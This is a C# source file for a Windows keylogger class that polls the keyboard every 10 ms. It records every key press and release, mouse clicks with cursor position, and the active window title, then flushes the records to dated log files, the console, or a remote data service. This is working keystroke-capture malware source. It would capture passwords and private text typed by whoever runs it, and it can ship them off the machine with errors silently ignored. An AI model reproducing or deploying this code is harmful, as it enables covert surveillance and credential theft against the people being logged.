
using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Collections.Generic;

namespace EyeKeyLoggerP
{	
	public class Keylogger
	{
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("User32.dll")]
			private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
		[DllImport("User32.dll")]
			private static extern short GetAsyncKeyState(System.Int32 vKey);

        //[DllImport("User32.dll")]
        //private static extern short GetKeyboardState(System.Byte[] bAr);
        [DllImport("User32.dll")]
			public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
		[DllImport("User32.dll")]
			public static extern int GetForegroundWindow();

        private object locker = new object();
        private List<System.String> bufList;
        private int[] keyBoardMap = new int[256];
        private System.Timers.Timer timerKeyMine;
		private System.Timers.Timer timerBufferFlush;
		private System.String hWndTitle;
		private System.String hWndTitlePast;
		public  System.String LOG_FILE;
		public  System.String LOG_MODE;
		public  System.String LOG_OUT;
        public System.Boolean SERVICE;
        private bool tglAlt = false;
		private bool tglControl = false;
		private bool tglCapslock = false;

        private HookManager hookManager;

		public Keylogger()
		{
            initMap();
           // hookManager = new HookManager(gkh_KeyDown, gkh_KeyUp);
            hWndTitle = ActiveApplTitle();
			hWndTitlePast = hWndTitle;


			//
			// keyBuffer
			//
            bufList = new List<string>();

            // 
            // timerKeyMine
            // 
            this.timerKeyMine = new System.Timers.Timer();
            this.timerKeyMine.Enabled = true;
            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed2);
            this.timerKeyMine.Interval = 10;

            // 
            // timerBufferFlush
            //
            this.timerBufferFlush = new System.Timers.Timer();
			this.timerBufferFlush.Enabled = true;
			this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
			this.timerBufferFlush.Interval = 1800000; // 30 minutes
		}

        private void initMap()
        {
           // foreach (var i in keyBoardMap)
                //keyBoardMap[i] = 0;
        }

		public static string ActiveApplTitle()
		{
			int hwnd = GetForegroundWindow();
			StringBuilder sbTitle = new StringBuilder(1024);
			int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
			if ((intLength <= 0) || (intLength > sbTitle.Length)) return "unknown";
			string title = sbTitle.ToString();
			return title;
		}

        void gkh_KeyUp(object sender, KeyEventArgs e)
        {
            // lstLog.Items.Add("Up\t" + e.KeyCode.ToString());

            string bufferLine = getTitleAndTIme();
            bufferLine += ",[Re],";
            bufferLine += "[" + e.KeyCode.ToString() + "]";
            e.Handled = true;

            lock (locker)
            {
                bufList.Add(bufferLine);
            }
        }

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            //  lstLog.Items.Add("Down\t" + e.KeyCode.ToString());
            string bufferLine = getTitleAndTIme();
            bufferLine += ",[Pr],";
            bufferLine += "[" + e.KeyCode.ToString() + "]";
            e.Handled = true;

            lock (locker)
            {
                bufList.Add(bufferLine);
            }
        }

        string getTitleAndTIme()
        {
            System.String buffer;
            buffer = "";

            buffer += "[" + DateTime.Now.Ticks + "],";

            hWndTitle = ActiveApplTitle();
            buffer += "[" + hWndTitle + "]";

            return buffer;
        }

        private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
		{
			//		if(hWndTitle != hWndTitlePast)
            //		{
            //			if(LOG_OUT == "file")
            //				keyBuffer += "[" + hWndTitle + "],";
            //			else
            //			{
            //				Flush2Console("[" + hWndTitle + "],", true);
            //				if(keyBuffer.Length > 0)
            //					Flush2Console(keyBuffer, false);
            //			}
            //			hWndTitlePast = hWndTitle;
            //		}


            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
			{
				if(GetAsyncKeyState(i) == -32767)
				{
                    //Console.WriteLine(i.ToString()); // Outputs the pressed key code [Debugging purposes]

                    System.String keyBuffer;
                    keyBuffer = "";

                    keyBuffer += DateTime.Now.Ticks + ",";
                    
                    if (ControlKey)
					{
						if(!tglControl)
						{
							tglControl = true;
							keyBuffer += "<PrControl>";
						}
					}
					else
					{
						if(tglControl)
						{
							tglControl = false;
							keyBuffer += "<ReControl>";
						}
					}

					if(AltKey)
					{
						if(!tglAlt)
						{
							tglAlt = true;
							keyBuffer += "<PrAlt>";
						}
					}
					else
					{
						if(tglAlt)
						{
							tglAlt = false;
							keyBuffer += "<ReAlt>";
						}
					}

					if(CapsLock)
					{
						if(!tglCapslock)
						{
							tglCapslock = true;
							keyBuffer += "<PrCapslock>";
						}
					}
					else
					{
						if(tglCapslock)
						{
							tglCapslock = false;
							keyBuffer += "<ReCapslock>";
						}
					}
					
					if(Enum.GetName(typeof(Keys), i) == "LButton")
						keyBuffer += "<LMouse>";
					else if(Enum.GetName(typeof(Keys), i) == "RButton")
						keyBuffer += "<RMouse>";
					else if(Enum.GetName(typeof(Keys), i) == "Back")
						keyBuffer += "<Backspace>";
					else if(Enum.GetName(typeof(Keys), i) == "Space")
						keyBuffer += " ";
					else if(Enum.GetName(typeof(Keys), i) == "Return")
						keyBuffer += "<Enter>";
					else if(Enum.GetName(typeof(Keys), i) == "ControlKey")
						continue;
					else if(Enum.GetName(typeof(Keys), i) == "LControlKey")
						continue;
					else if(Enum.GetName(typeof(Keys), i) == "RControlKey")
						continue;
					else if(Enum.GetName(typeof(Keys), i) == "LControlKey")
						continue;
					else if(Enum.GetName(typeof(Keys), i) == "ShiftKey")
						continue;
					else if(Enum.GetName(typeof(Keys), i) == "LShiftKey")
						continue;
					else if(Enum.GetName(typeof(Keys), i) == "RShiftKey")
						continue;
					else if(Enum.GetName(typeof(Keys), i) == "Delete")
						keyBuffer += "<Del>";
					else if(Enum.GetName(typeof(Keys), i) == "Insert")
						keyBuffer += "<Ins>";
					else if(Enum.GetName(typeof(Keys), i) == "Home")
						keyBuffer += "<Home>";
					else if(Enum.GetName(typeof(Keys), i) == "End")
						keyBuffer += "<End>";
					else if(Enum.GetName(typeof(Keys), i) == "Tab")
						keyBuffer += "<Tab>";
					else if(Enum.GetName(typeof(Keys), i) == "Prior")
						keyBuffer += "<Page Up>";
					else if(Enum.GetName(typeof(Keys), i) == "PageDown")
						keyBuffer += "<Page Down>";
					else if(Enum.GetName(typeof(Keys), i) == "LWin" || Enum.GetName(typeof(Keys), i) == "RWin")
						keyBuffer += "<Win>";
					
					/* ********************************************** *
					 * Detect key based off ShiftKey Toggle
					 * ********************************************** */
					if(ShiftKey)
					{
						if(i >= 65 && i <= 122)
						{
							keyBuffer += (char)i;
						}
						else if(i.ToString() == "49")
							keyBuffer += "!";
						else if(i.ToString() == "50")
							keyBuffer += "@";
						else if(i.ToString() == "51")
							keyBuffer += "#";
						else if(i.ToString() == "52")
							keyBuffer += "$";
						else if(i.ToString() == "53")
							keyBuffer += "%";
						else if(i.ToString() == "54")
							keyBuffer += "^";
						else if(i.ToString() == "55")
							keyBuffer += "&";
						else if(i.ToString() == "56")
							keyBuffer += "*";
						else if(i.ToString() == "57")
							keyBuffer += "(";
						else if(i.ToString() == "48")
							keyBuffer += ")";
						else if(i.ToString() == "192")
							keyBuffer += "~";
						else if(i.ToString() == "189")
							keyBuffer += "_";
						else if(i.ToString() == "187")
							keyBuffer += "+";
						else if(i.ToString() == "219")
							keyBuffer += "{";
						else if(i.ToString() == "221")
							keyBuffer += "}";
						else if(i.ToString() == "220")
							keyBuffer += "|";
						else if(i.ToString() == "186")
							keyBuffer += ":";
						else if(i.ToString() == "222")
							keyBuffer += "\"";
						else if(i.ToString() == "188")
							keyBuffer += "<";
						else if(i.ToString() == "190")
							keyBuffer += ">";
						else if(i.ToString() == "191")
							keyBuffer += "?";
					}
					else
					{
						if(i >= 65 && i <= 122)
						{
							keyBuffer += (char)(i + 32);
						}
						else if(i.ToString() == "49")
							keyBuffer += "1";
						else if(i.ToString() == "50")
							keyBuffer += "2";
						else if(i.ToString() == "51")
							keyBuffer += "3";
						else if(i.ToString() == "52")
							keyBuffer += "4";
						else if(i.ToString() == "53")
							keyBuffer += "5";
						else if(i.ToString() == "54")
							keyBuffer += "6";
						else if(i.ToString() == "55")
							keyBuffer += "7";
						else if(i.ToString() == "56")
							keyBuffer += "8";
						else if(i.ToString() == "57")
							keyBuffer += "9";
						else if(i.ToString() == "48")
							keyBuffer += "0";
						else if(i.ToString() == "189")
							keyBuffer += "-";
						else if(i.ToString() == "187")
							keyBuffer += "=";
						else if(i.ToString() == "92")
							keyBuffer += "`";
						else if(i.ToString() == "219")
							keyBuffer += "[";
						else if(i.ToString() == "221")
							keyBuffer += "]";
						else if(i.ToString() == "220")
							keyBuffer += "\\";
						else if(i.ToString() == "186")
							keyBuffer += ";";
						else if(i.ToString() == "222")
							keyBuffer += "'";
						else if(i.ToString() == "188")
							keyBuffer += ",";
						else if(i.ToString() == "190")
							keyBuffer += ".";
						else if(i.ToString() == "191")
							keyBuffer += "/";
					}

                    keyBuffer += ",";
                    keyBuffer += ActiveApplTitle();

                    lock (locker) {
                        bufList.Add(keyBuffer);
                    }
                }
            }
           // keyBuffer += ",";
           // keyBuffer += "[" + DateTime.Now.Ticks + "]\n";

        }

        internal static class NativeMethods
        {

            [DllImport("User32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool GetKeyboardState(byte[] lpKeyState);

        }

        public static int GetKeyState(VirtualKeyStates testKey)
        {
            byte[] keys = new byte[256];

            //Get pressed keys
            if (!NativeMethods.GetKeyboardState(keys))
            {
                int err = Marshal.GetLastWin32Error();
                throw new Win32Exception(err);
            }

            Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000);

            for (int i = 0; i < 256; i++)
            {

                byte key = keys[i];

                //Logical 'and' so we can drop the low-order bit for toggled keys, else that key will appear with the value 1!
                if ((key & 0x80) != 0)
                {

                    //This is just for a short demo, you may want this to return
                    //multiple keys!
                    return (int)key;
                }
            }
            return -1;
        }

        public static int IsKeyPressed(Keys testKey)
        {
           // bool keyPressed = false;
            //short result = GetKeyState(testKey);

            //if(Convert.ToBoolean(GetAsyncKeyState(testKey) & 0x8000))
          //  {

          //  }

            //switch (result)
           // {
           //     case 0:
           //         // Not pressed and not toggled on.
           //         keyPressed = false;
           //         break;

           //     case 1:
           //         // Not pressed, but toggled on
           //         keyPressed = false;
           //         break;

           //     default:
           //         // Pressed (and may be toggled on)
           //         keyPressed = true;
           //         break;
           // }

            return Convert.ToBoolean(GetAsyncKeyState(testKey) & 0x8000)?1:0;
        }
   
       
        private void timerKeyMine_Elapsed2(object sender, System.Timers.ElapsedEventArgs e)
        {

            int[] bAr = new int[256];
            // GetKeyboardState(bAr);

            for (System.Int32 i = 0; i<256; i++) {
                Keys key;
                Enum.TryParse<Keys>(Enum.GetName(typeof(Keys), i), out key);
                bAr[i] = IsKeyPressed(key);
            }

            for (System.Int32 i = 0; i < 256; i++)
            {
                if (bAr[i] != keyBoardMap[i])
                {
                    string op = "";
                    op = (bAr[i] == 0) ? ("Re") : ("Pr");
                    string key = Enum.GetName(typeof(Keys), i);

                    if(key == "LButton")
                    {
                        op = "ML" + op;
                        key = Cursor.Position.X + "-" + Cursor.Position.Y;
                    }

                    if (key == "RButton")
                    {
                        op = "MR" + op;
                        key = Cursor.Position.X + "-" + Cursor.Position.Y;
                    }

                    hWndTitle = ActiveApplTitle();

                    System.String keyBuffer;
                    keyBuffer = "[" + DateTime.Now.Ticks + "],[" + op + "],[" + key + "],[" + hWndTitle + "]";

                    if (ControlKey)
                    {
                        if (!tglControl)
                        {
                            tglControl = true;
                            keyBuffer += "<Ctrl=On>";
                        }
                    }
                    else
                    {
                        if (tglControl)
                        {
                            tglControl = false;
                            keyBuffer += "<Ctrl=Off>";
                        }
                    }

                    if (AltKey)
                    {
                        if (!tglAlt)
                        {
                            tglAlt = true;
                            keyBuffer += "<Alt=On>";
                        }
                    }
                    else
                    {
                        if (tglAlt)
                        {
                            tglAlt = false;
                            keyBuffer += "<Alt=Off>";
                        }
                    }

                    if (CapsLock)
                    {
                        if (!tglCapslock)
                        {
                            tglCapslock = true;
                            keyBuffer += "<CapsLock=On>";
                        }
                    }
                    else
                    {
                        if (tglCapslock)
                        {
                            tglCapslock = false;
                            keyBuffer += "<CapsLock=Off>";
                        }
                    }

                    lock (locker)
                    {
                        if (SERVICE)
                            Flush2Service(String.Copy(keyBuffer));
                        bufList.Add(keyBuffer);
                        keyBoardMap[i] = bAr[i];
                    }


                }
            }
        }

        #region toggles
        public static bool ControlKey
		{
			get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000); }
		} // ControlKey
		public static bool ShiftKey
		{
			get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000); }
		} // ShiftKey
		public static bool CapsLock
		{
			get { return Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock) & 0x8000); }
		} // CapsLock
		public static bool AltKey
		{
			get { return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000); }
		} // AltKey
		#endregion

		private void timerBufferFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
		{
			if((LOG_OUT == "file") || (LOG_OUT == "service"))
			{
				if(bufList.Count > 0)
					Flush2File(LOG_FILE);
			}
			else
			{
				if(bufList.Count > 0)
					Flush2Console();
			}
		}

		public void Flush2Console()
		{
            lock (locker)
            {
                foreach (var line in bufList)
                    Console.WriteLine(line);

                bufList.Clear();
            }
        }

        public void Flush2Service(string line)
        {
            ServiceReference.DataServiceClient client = new
            ServiceReference.DataServiceClient();

            // TODO fix
            try {
                client.flushUserRecord(line);
            }
            catch(Exception e)
            {

            }
            client.Close();
        }

		public void Flush2File(string file)
		{
			string AmPm = "";
			try
			{
				if(LOG_MODE == "hour")
				{
					if(DateTime.Now.TimeOfDay.Hours >= 0 && DateTime.Now.TimeOfDay.Hours <= 11)
						AmPm = "AM";
					else
						AmPm = "PM";
					file += "_" + DateTime.Now.ToString("hh") + AmPm + ".log";
				}
				else
					file += "_" + DateTime.Now.ToString("MM.dd.yyyy") + ".log";

				FileStream fil = new FileStream(file, FileMode.Append, FileAccess.Write);

                lock (locker)
                {
                    using (StreamWriter sw = new StreamWriter(fil))
                    {
                        foreach(var line in bufList)
                            sw.WriteLine(line);
                    }

                    bufList.Clear();
                }
			}
			catch(Exception ex)
			{
				// Uncomment this to help debug.
				// Console.WriteLine(ex.Message);
				throw;
			}
		}

		#region Properties
		public System.Boolean Enabled
		{
			get
			{
				return timerKeyMine.Enabled && timerBufferFlush.Enabled;
			}
			set
			{
				timerKeyMine.Enabled = timerBufferFlush.Enabled = value;
			}
		}

        public System.Boolean EnabledFileFlash
        {
            get
            {
                return timerBufferFlush.Enabled;
            }
            set
            {
                timerBufferFlush.Enabled = value;
            }
        }

        public System.Double FlushInterval
		{
			get
			{
				return timerBufferFlush.Interval;
			}
			set
			{
				timerBufferFlush.Interval = value;
			}
		}

		public System.Double MineInterval
		{
			get
			{
				return timerKeyMine.Interval;
			}
			set
			{
				timerKeyMine.Interval = value;
			}
		}
        #endregion

        #region ICD
        public enum VirtualKeyStates : int
        {
            VK_LBUTTON = 0x01,
            VK_RBUTTON = 0x02,
            VK_CANCEL = 0x03,
            VK_MBUTTON = 0x04,
            //
            VK_XBUTTON1 = 0x05,
            VK_XBUTTON2 = 0x06,
            //
            VK_BACK = 0x08,
            VK_TAB = 0x09,
            //
            VK_CLEAR = 0x0C,
            VK_RETURN = 0x0D,
            //
            VK_SHIFT = 0x10,
            VK_CONTROL = 0x11,
            VK_MENU = 0x12,
            VK_PAUSE = 0x13,
            VK_CAPITAL = 0x14,
            //
            VK_KANA = 0x15,
            VK_HANGEUL = 0x15, /* old name - should be here for compatibility */
            VK_HANGUL = 0x15,
            VK_JUNJA = 0x17,
            VK_FINAL = 0x18,
            VK_HANJA = 0x19,
            VK_KANJI = 0x19,
            //
            VK_ESCAPE = 0x1B,
            //
            VK_CONVERT = 0x1C,
            VK_NONCONVERT = 0x1D,
            VK_ACCEPT = 0x1E,
            VK_MODECHANGE = 0x1F,
            //
            VK_SPACE = 0x20,
            VK_PRIOR = 0x21,
            VK_NEXT = 0x22,
            VK_END = 0x23,
            VK_HOME = 0x24,
            VK_LEFT = 0x25,
            VK_UP = 0x26,
            VK_RIGHT = 0x27,
            VK_DOWN = 0x28,
            VK_SELECT = 0x29,
            VK_PRINT = 0x2A,
            VK_EXECUTE = 0x2B,
            VK_SNAPSHOT = 0x2C,
            VK_INSERT = 0x2D,
            VK_DELETE = 0x2E,
            VK_HELP = 0x2F,
            //
            VK_LWIN = 0x5B,
            VK_RWIN = 0x5C,
            VK_APPS = 0x5D,
            //
            VK_SLEEP = 0x5F,
            //
            VK_NUMPAD0 = 0x60,
            VK_NUMPAD1 = 0x61,
            VK_NUMPAD2 = 0x62,
            VK_NUMPAD3 = 0x63,
            VK_NUMPAD4 = 0x64,
            VK_NUMPAD5 = 0x65,
            VK_NUMPAD6 = 0x66,
            VK_NUMPAD7 = 0x67,
            VK_NUMPAD8 = 0x68,
            VK_NUMPAD9 = 0x69,
            VK_MULTIPLY = 0x6A,
            VK_ADD = 0x6B,
            VK_SEPARATOR = 0x6C,
            VK_SUBTRACT = 0x6D,
            VK_DECIMAL = 0x6E,
            VK_DIVIDE = 0x6F,
            VK_F1 = 0x70,
            VK_F2 = 0x71,
            VK_F3 = 0x72,
            VK_F4 = 0x73,
            VK_F5 = 0x74,
            VK_F6 = 0x75,
            VK_F7 = 0x76,
            VK_F8 = 0x77,
            VK_F9 = 0x78,
            VK_F10 = 0x79,
            VK_F11 = 0x7A,
            VK_F12 = 0x7B,
            VK_F13 = 0x7C,
            VK_F14 = 0x7D,
            VK_F15 = 0x7E,
            VK_F16 = 0x7F,
            VK_F17 = 0x80,
            VK_F18 = 0x81,
            VK_F19 = 0x82,
            VK_F20 = 0x83,
            VK_F21 = 0x84,
            VK_F22 = 0x85,
            VK_F23 = 0x86,
            VK_F24 = 0x87,
            //
            VK_NUMLOCK = 0x90,
            VK_SCROLL = 0x91,
            //
            VK_OEM_NEC_EQUAL = 0x92, // '=' key on numpad
                                     //
            VK_OEM_FJ_JISHO = 0x92, // 'Dictionary' key
            VK_OEM_FJ_MASSHOU = 0x93, // 'Unregister word' key
            VK_OEM_FJ_TOUROKU = 0x94, // 'Register word' key
            VK_OEM_FJ_LOYA = 0x95, // 'Left OYAYUBI' key
            VK_OEM_FJ_ROYA = 0x96, // 'Right OYAYUBI' key
                                   //
            VK_LSHIFT = 0xA0,
            VK_RSHIFT = 0xA1,
            VK_LCONTROL = 0xA2,
            VK_RCONTROL = 0xA3,
            VK_LMENU = 0xA4,
            VK_RMENU = 0xA5,
            //
            VK_BROWSER_BACK = 0xA6,
            VK_BROWSER_FORWARD = 0xA7,
            VK_BROWSER_REFRESH = 0xA8,
            VK_BROWSER_STOP = 0xA9,
            VK_BROWSER_SEARCH = 0xAA,
            VK_BROWSER_FAVORITES = 0xAB,
            VK_BROWSER_HOME = 0xAC,
            //
            VK_VOLUME_MUTE = 0xAD,
            VK_VOLUME_DOWN = 0xAE,
            VK_VOLUME_UP = 0xAF,
            VK_MEDIA_NEXT_TRACK = 0xB0,
            VK_MEDIA_PREV_TRACK = 0xB1,
            VK_MEDIA_STOP = 0xB2,
            VK_MEDIA_PLAY_PAUSE = 0xB3,
            VK_LAUNCH_MAIL = 0xB4,
            VK_LAUNCH_MEDIA_SELECT = 0xB5,
            VK_LAUNCH_APP1 = 0xB6,
            VK_LAUNCH_APP2 = 0xB7,
            //
            VK_OEM_1 = 0xBA, // ';:' for US
            VK_OEM_PLUS = 0xBB, // '+' any country
            VK_OEM_COMMA = 0xBC, // ',' any country
            VK_OEM_MINUS = 0xBD, // '-' any country
            VK_OEM_PERIOD = 0xBE, // '.' any country
            VK_OEM_2 = 0xBF, // '/?' for US
            VK_OEM_3 = 0xC0, // '`~' for US
                             //
            VK_OEM_4 = 0xDB, // '[{' for US
            VK_OEM_5 = 0xDC, // '\|' for US
            VK_OEM_6 = 0xDD, // ']}' for US
            VK_OEM_7 = 0xDE, // ''"' for US
            VK_OEM_8 = 0xDF,
            //
            VK_OEM_AX = 0xE1, // 'AX' key on Japanese AX kbd
            VK_OEM_102 = 0xE2, // "<>" or "\|" on RT 102-key kbd.
            VK_ICO_HELP = 0xE3, // Help key on ICO
            VK_ICO_00 = 0xE4, // 00 key on ICO
                              //
            VK_PROCESSKEY = 0xE5,
            //
            VK_ICO_CLEAR = 0xE6,
            //
            VK_PACKET = 0xE7,
            //
            VK_OEM_RESET = 0xE9,
            VK_OEM_JUMP = 0xEA,
            VK_OEM_PA1 = 0xEB,
            VK_OEM_PA2 = 0xEC,
            VK_OEM_PA3 = 0xED,
            VK_OEM_WSCTRL = 0xEE,
            VK_OEM_CUSEL = 0xEF,
            VK_OEM_ATTN = 0xF0,
            VK_OEM_FINISH = 0xF1,
            VK_OEM_COPY = 0xF2,
            VK_OEM_AUTO = 0xF3,
            VK_OEM_ENLW = 0xF4,
            VK_OEM_BACKTAB = 0xF5,
            //
            VK_ATTN = 0xF6,
            VK_CRSEL = 0xF7,
            VK_EXSEL = 0xF8,
            VK_EREOF = 0xF9,
            VK_PLAY = 0xFA,
            VK_ZOOM = 0xFB,
            VK_NONAME = 0xFC,
            VK_PA1 = 0xFD,
            VK_OEM_CLEAR = 0xFE
        }
        #endregion

        internal HookManager HookManager
        {
            get
            {
                throw new System.NotImplementedException();
            }

            set
            {
            }
        }

        internal HookManager HookManager1
        {
            get
            {
                throw new System.NotImplementedException();
            }

            set
            {
            }
        }

        public ServiceReference.DataServiceClient DataServiceClient
        {
            get
            {
                throw new System.NotImplementedException();
            }

            set
            {
            }
        }
    }
}
